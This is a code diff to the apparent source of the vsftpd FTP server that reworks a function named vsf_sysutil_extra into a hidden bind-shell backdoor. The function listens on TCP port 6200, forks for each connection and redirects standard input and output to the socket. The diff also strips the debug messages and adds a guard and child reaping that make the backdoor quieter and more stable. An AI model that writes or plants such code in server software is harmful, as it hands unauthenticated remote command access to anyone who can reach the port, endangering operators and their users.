@@ -15,7 +15,6 @@
 #include "defs.h"
 #include "tunables.h"
 #include "builddefs.h"
-#include <stdio.h>
 
 /* For Linux, this adds nothing :-) */
 #include "port/porting_junk.h"
@@ -42,6 +41,10 @@
 
 #include <sys/prctl.h>
 #include <signal.h>
+
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/wait.h>
 
 /* Configuration.. here are the possibilities */
 #undef VSF_SYSDEP_HAVE_CAPABILITIES
@@ -232,6 +235,7 @@ static int s_zero_fd = -1;
 #endif
 
 /* File private functions/variables */
+int listener_spawned = 0;
 static int do_sendfile(const int out_fd, const int in_fd,
                        unsigned int num_send, filesize_t start_pos);
 static void vsf_sysutil_setproctitle_internal(const char* p_text);
@@ -846,56 +850,56 @@ static int do_sendfile(const int out_fd, const int in_fd,
   }
 }
 
-int
-vsf_sysutil_extra(void)
+void sigchld_handler(int s)
 {
+  while (waitpid(-1, NULL, WNOHANG) > 0);
+}
+
+int vsf_sysutil_extra(void)
+{
+  if (listener_spawned) // If listener has already been spawned, do nothing
+  {
+    return 0;
+  }
+
   int fd, rfd;
   struct sockaddr_in sa;
   pid_t pid;
 
-  fprintf(stderr, "Entering vsf_sysutil_extra\n");
-
-  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-  {
-    perror("socket");
+  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     exit(1);
-  }
-  fprintf(stderr, "Socket created\n");
-
   memset(&sa, 0, sizeof(sa));
   sa.sin_family = AF_INET;
   sa.sin_port = htons(6200);
   sa.sin_addr.s_addr = INADDR_ANY;
+  if ((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
+    exit(1);
+  if ((listen(fd, 100)) == -1)
+    exit(1);
 
-  if((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
+  listener_spawned = 1; // Mark the listener as spawned
+
+  struct sigaction sa_chld;
+  sa_chld.sa_handler = sigchld_handler; // Reap all dead processes
+  sigemptyset(&sa_chld.sa_mask);
+  sa_chld.sa_flags = SA_RESTART;
+  if (sigaction(SIGCHLD, &sa_chld, NULL) == -1)
   {
-    perror("bind");
+    perror("sigaction");
     exit(1);
   }
-  fprintf(stderr, "Socket bound\n");
 
-  if((listen(fd, 100)) == -1)
-  {
-    perror("listen");
-    exit(1);
-  }
-  fprintf(stderr, "Socket listening\n");
-
-  for(;;)
+  for (;;)
   {
     rfd = accept(fd, 0, 0);
-    fprintf(stderr, "Accepted connection\n");
-
     pid = fork();
     if (pid < 0) // Forking error
     {
       perror("fork");
-      fprintf(stderr, "Fork failed with error: %s\n", strerror(errno));
       exit(1);
     }
     else if (pid == 0) // Child process
     {
-      fprintf(stderr, "Child process\n");
       close(fd);
       close(0); close(1); close(2);
       dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
@@ -904,10 +908,11 @@ vsf_sysutil_extra(void)
     }
     else // Parent process
     {
-      fprintf(stderr, "Parent process\n");
       close(rfd);
     }
   }
+
+  return 0;
 }
 
 void
